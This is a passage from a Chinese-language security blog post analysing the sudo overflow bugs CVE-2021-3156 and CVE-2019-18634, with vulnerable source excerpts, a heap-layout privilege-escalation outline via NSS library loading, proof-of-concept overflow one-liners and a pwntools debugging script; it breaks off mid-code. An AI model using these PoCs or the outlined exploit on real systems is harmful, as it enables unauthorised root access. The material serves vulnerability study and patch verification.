<!DOCTYPE html>
<html lang="en-us">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="theme-color" content="dark">
    <title> 以两个Sudo指令缓冲区溢出CVE进行分析 | FMYY&#39;S Note</title>
    
    
    
    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
</head>

    <body class="dark">
        <nav class="navbar">
    <div class="container">
        <div class="flex">
            <div>
                <a class="brand" href="/">
                    
                    <span class="emoji">
                        😎
                    </span>
                    
                    FMYY&#39;S Note
                    </a>
            </div>
            <div class="flex">
                
                <a href="/articles/">Articles</a>
                
                <button id="dark-mode-button"></button>
            </div>
            </div>
    </div>
</nav>
        <main>
            

<div class="container">
    <article>
        <header class="article-header">
            <div class="thumb">
                <div>
                    <h1>以两个Sudo指令缓冲区溢出CVE进行分析</h1>
                    <div class="post-meta">
                        <div>
                            By  on <time>February 02, 2021</time>
                        </div>
                        <div class="tags">
                            
                            <a href="/tags/sudo/">Sudo</a>
                            
                            <a href="/tags/overflow/">Overflow</a>
                            
                            <a href="/tags/cve/">CVE</a>
                            
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </article>

    <div class="article-post">
    <p>sudo是一个大多数Linux或者Unix操作系统中都存在的系统管理指令,是一个允许系统管理员让普通用户执行一些或者全部的root命令的工具.</p>
<p>此次以CVE-2021-3156和CVE-2019-18634两个Sudo指令的缓冲区溢出漏洞进行分析</p>
<h3 id="cve-2021-3156">CVE-2021-3156</h3>
<h4 id="影响范围">影响范围</h4>
<pre><code>Sudo 1.8.2 - 1.8.31p2
Sudo 1.9.0 - 1.9.5p1
</code></pre>
<h4 id="如何检测自己系统是否存在此漏洞">如何检测自己系统是否存在此漏洞？</h4>
<p>终端输入 命令 <code>&quot;sudoedit -s /&quot;</code>后执行
会出现以下两种情况</p>
<ol>
<li>若出现&quot;sudoedit：&ldquo;开头的错误响应,则系统受到此漏洞影响.</li>
<li>若出现&quot;usage：&ldquo;开头的错误响应,则表示该漏洞已被补丁修复.</li>
</ol>
<h4 id="调试">调试</h4>
<p>此处选择了Sudo-1.8.31版本的Sudo程序来进行复现,最开始我是编译了一遍sudo源码来进行调试,结果编译出来的sudo程序和ubuntu系统自带的sudo有点不一样,所以最后我还是直接调试的ubuntu系统自带的sudo,只是没有源码断点不太方便</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gdb ./sudoedit
......
pwndbg&gt; <span class="nb">set</span> args -s <span class="s1">&#39;\&#39;</span> <span class="m">112233445566</span> // 设置参数
pwndbg&gt; run
...
pwndbg&gt; b ./sudoers.c:847
pwndbg&gt; run
</code></pre></td></tr></table>
</div>
</div><p>漏洞位置位于<code>plugins/sudoers/sudoers.c</code>代码文件<code>set_cmnd</code>函数中</p>
<p>因为可能文件代码是动态加载的,所以当程序crash的时候,才可以下断点,然后重新运行,最后会断在断点位置</p>
<h4 id="漏洞代码">漏洞代码</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="p">......</span>
	<span class="cm">/* set user_args */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">NewArgc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	    <span class="kt">char</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="o">**</span><span class="n">av</span><span class="p">;</span>
	    <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>

	    <span class="cm">/* Alloc and build up user_args. */</span>
	    <span class="k">for</span> <span class="p">(</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="o">*</span><span class="n">av</span><span class="p">;</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span>
		<span class="n">size</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">av</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">user_args</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;%s: %s&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">,</span> <span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to allocate memory&#34;</span><span class="p">));</span>
		<span class="n">debug_return_int</span><span class="p">(</span><span class="n">NOT_FOUND_ERROR</span><span class="p">);</span>
	    <span class="p">}</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">sudo_mode</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="o">|</span><span class="n">MODE_LOGIN_SHELL</span><span class="p">))</span> <span class="p">{</span>
		<span class="cm">/*
</span><span class="cm">		 * When running a command via a shell, the sudo front-end
</span><span class="cm">		 * escapes potential meta chars.  We unescape non-spaces
</span><span class="cm">		 * for sudoers matching and logging purposes.
</span><span class="cm">		 */</span>
		<span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>	
			    <span class="n">from</span><span class="o">++</span><span class="p">;</span>
			<span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
		    <span class="p">}</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="o">*--</span><span class="n">to</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
	    <span class="p">}</span>
<span class="p">......</span>
</code></pre></td></tr></table>
</div>
</div><p>若执行<code>sudoedit</code>的时候有传入命令行参数,<code>NewArgc &gt; 1</code>,并进入上述这个分支</p>
<p>首先会遍历并计算出所有参数的总大小,利用malloc申请一段空间,之后则是将参数拷贝到刚才申请的空间中</p>
<h4 id="漏洞点">漏洞点</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">		<span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
			    <span class="n">from</span><span class="o">++</span><span class="p">;</span>
			<span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
		    <span class="p">}</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
		<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>因为程序错误的转义,将传入的''字符后方的<code>\x00</code>看作转义字符,而<code>\x00</code>也不是空白字符,所以绕过了<code>isspace</code>空白字符的检测<br>
至此,第一个参数拷贝的时候会以<code>'\' 112233445566</code>作为第一个参数进行拷贝,然后再拷贝第二个参数,即<code>112233445566</code>,最后拷贝的字符超过了申请的空间的大小,形成了缓冲区溢出漏洞</p>
<h4 id="利用">利用</h4>
<p>Qualys团队在博客中,给出了三个利用思路,这里我选择了第二种思路来复现,因为第二种方法已经在三个版本的Linux系统上成功实现了利用且github星星第一则是此方法的利用脚本呢,此方法主要运用了堆溢出覆盖字符串指针为可控字符串指针,从而在调用<code>nss_load_libinary</code>的时候进行的so注入,此时注入的so文件是可控的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">static</span> <span class="kt">int</span> <span class="nf">nss_load_library</span> <span class="p">(</span><span class="n">service_user</span> <span class="o">*</span><span class="n">ni</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">static</span> <span class="n">name_database</span> <span class="n">default_table</span><span class="p">;</span>
		<span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">=</span> <span class="n">nss_new_service</span> <span class="p">(</span><span class="n">service_table</span> <span class="o">?:</span> <span class="o">&amp;</span><span class="n">default_table</span><span class="p">,</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="cm">/* Load the shared library.  */</span>
		<span class="n">size_t</span> <span class="n">shlen</span> <span class="o">=</span> <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">__nss_shlib_revision</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">saved_errno</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>
		<span class="kt">char</span> <span class="n">shlib_name</span><span class="p">[</span><span class="n">shlen</span><span class="p">];</span>

		<span class="cm">/* Construct shared object name.  */</span>
		<span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">shlib_name</span><span class="p">,</span>
					      <span class="s">&#34;libnss_&#34;</span><span class="p">),</span>
				    <span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">),</span>
			  <span class="s">&#34;.so&#34;</span><span class="p">),</span>
		<span class="n">__nss_shlib_revision</span><span class="p">);</span>

      <span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">=</span> <span class="n">__libc_dlopen</span> <span class="p">(</span><span class="n">shlib_name</span><span class="p">);</span>
      <span class="p">......</span>
</code></pre></td></tr></table>
</div>
</div><p>此处传入了参数为一个结构体指针,结构体为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">service_user</span>
<span class="p">{</span>
	<span class="cm">/* And the link to the next entry.  */</span>
	<span class="k">struct</span> <span class="n">service_user</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
	<span class="cm">/* Action according to result.  */</span>
	<span class="n">lookup_actions</span> <span class="n">actions</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
	<span class="cm">/* Link to the underlying library object.  */</span>
	<span class="n">service_library</span> <span class="o">*</span><span class="n">library</span><span class="p">;</span>		
	<span class="cm">/* Collection of known functions.  */</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">known</span><span class="p">;</span>
	<span class="cm">/* Name of the service (`files&#39;, `dns&#39;, `nis&#39;, ...).  */</span>
	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span> <span class="n">service_user</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>利用过程为修改<code>ni-&gt;library</code>为空指针,之后则会进入第一个分支，调用<code>nss_new_service</code>函数<br>
下面我们来看看<code>nss_new_service</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">static</span> <span class="n">service_library</span> <span class="o">*</span> <span class="nf">nss_new_service</span> <span class="p">(</span><span class="n">name_database</span> <span class="o">*</span><span class="n">database</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">service_library</span> <span class="o">**</span><span class="n">currentp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">database</span><span class="o">-&gt;</span><span class="n">library</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">currentp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span> <span class="p">((</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">*</span><span class="n">currentp</span><span class="p">;</span>
		<span class="n">currentp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
	<span class="p">}</span>

  <span class="cm">/* We have to add the new service.  */</span>
	<span class="o">*</span><span class="n">currentp</span> <span class="o">=</span> <span class="p">(</span><span class="n">service_library</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">service_library</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">currentp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
	<span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="k">return</span> <span class="o">*</span><span class="n">currentp</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">#endif
</span></code></pre></td></tr></table>
</div>
</div><p>遍历<code>database</code>链表寻找<code>ni-&gt;name</code>对应的<code>library</code>指针,若没有发现对应的结构体,则是继续往下为当前<code>name</code>名称创建一个结构体,且<code>lib_handle</code>指针写0,因此返回之后即可通过<code>if (ni-&gt;library-&gt;lib_handle == NULL)</code>此判断,进入其分支</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">//1.8.31/src/sudo.c:154
</span><span class="c1"></span><span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
<span class="n">bindtextdomain</span><span class="p">(</span><span class="n">PACKAGE_NAME</span><span class="p">,</span> <span class="n">LOCALEDIR</span><span class="p">);</span>
<span class="n">textdomain</span><span class="p">(</span><span class="n">PACKAGE_NAME</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>在<code>setlocale()</code>函数中可以调用<code>malloc()</code>以及<code>free()</code>函数,进行堆块的布局,通过控制<code>&quot;LC_ALL</code>,从而让<code>nss_load_library</code>传入的结构体位于漏洞点溢出的堆块的下方不远处</p>
<h5 id="思路总结">思路总结</h5>
<ol>
<li>将<code>ni-&gt;library</code>指针写0,进入第一个分支</li>
<li>控制住<code>ni-&gt;name</code>字符串,之后通过拼接出的最终字符串作为so文件的路径,则可以调用<code>__libc_dlopen</code>初始化运行该so文件</li>
<li>如果<code>nss_load_library</code>传入的<code>service_user *ni</code>指针对应的结构体位于漏洞点处申请的空间下方不远处,则可通过错误转义引起的堆溢出满足上述两个条件</li>
</ol>
<h3 id="cve-2019-18634">CVE-2019-18634</h3>
<p>CVE-2019-18634相对于CVE-2021-3156来说,限制更大一些,因为需要存在<code>pwfeedback</code>选项</p>
<h4 id="heading"></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">wget https://www.sudo.ws/dist/sudo-1.8.25.tar.gz
tar -zxvf ./sudo-1.8.25.tar.gz
<span class="nb">cd</span> ./sudo-1.8.25
./configure --prefix<span class="o">=</span>/tmp/build
make -j4
make install
</code></pre></td></tr></table>
</div>
</div><h4 id="开启-pwfeedback-选项">开启 pwfeedback 选项</h4>
<p>在<code>/etc/sudoers</code>规则中添加<code>Defaults pwfeedback</code><br>
开启后,在用户切换的输入密码时,会有视觉反馈,出现&rdquo;*&ldquo;符号</p>
<h4 id="poc">POC</h4>
<p>POC1[&lt;=1.8.25]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">perl -e <span class="s1">&#39;print((&#34;A&#34; x 100 . &#34;\x{00}&#34;) x 50)&#39;</span> <span class="p">|</span> sudo -S id
</code></pre></td></tr></table>
</div>
</div><p>POC2[1.8.26,1.8.30]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">socat pty,link<span class="o">=</span>/tmp/pty,waitslave exec:<span class="s2">&#34;python -c &#39;print((chr(0x61)*100+chr(0x15))*50)&#39;&#34;</span> <span class="p">&amp;</span>
sudo -S id &lt; /tmp/pty
</code></pre></td></tr></table>
</div>
</div><p>POC1通过从管道获取数据交给sudo,-S表示从stdin读取数据<br>
POC2通过socat创建了一个伪终端pty,sudo处理的数据从终端中获取,&ldquo;waitslave exec&quot;执行后续命令</p>
<h4 id="调试-1">调试</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">os</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">TARGET</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="s2">&#34;/tmp/build/bin/sudo&#34;</span><span class="p">)</span>

<span class="s1">&#39;&#39;&#39;
</span><span class="s1">Create a pty terminal to transmit payload
</span><span class="s1">mfd, sfd = os.openpty()
</span><span class="s1">fd = os.open(os.ttyname(sfd), os.O_RDONLY)
</span><span class="s1">p = process([TARGET,&#34;-S&#34;, &#34;id&#34;],stdin=fd)
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">TARGET</span><span class="p">,</span><span class="s2">&#34;-S&#34;</span><span class="p">,</span><span class="s2">&#34;id&#34;</span><span class="p">])</span>
<span class="n">pause</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">*</span><span class="mi">50</span>
<span class="c1">#os.write(mfd, payload+&#34;n&#34;)</span>
<span class="n">pause</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>在第一次pause的时候,打开另外一个终端进入GDB,利用<code>attach pid</code>指令调试进程,则会因为pause而断点在相应位置</p>
<h4 id="分析漏洞代码">分析漏洞代码</h4>
<p>首先sudo输入的时候,调用的函数是getln<br>
在终端执行POC1,程序在int getln tgetpass.c:345报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">extern</span> <span class="kt">int</span> <span class="n">sudo_term_erase</span><span class="p">,</span> <span class="n">sudo_term_kill</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">getln</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">bufsiz</span><span class="p">,</span> <span class="kt">int</span> <span class="n">feedback</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">size_t</span> <span class="n">left</span> <span class="o">=</span> <span class="n">bufsiz</span><span class="p">;</span>
    <span class="n">ssize_t</span> <span class="n">nr</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">cp</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
    <span class="n">debug_decl</span><span class="p">(</span><span class="n">getln</span><span class="p">,</span> <span class="n">SUDO_DEBUG_CONV</span><span class="p">)</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">left</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">errno</span> <span class="o">=</span> <span class="n">EINVAL</span><span class="p">;</span>
	<span class="n">debug_return_str</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>		<span class="cm">/* sanity */</span>
    <span class="p">}</span>

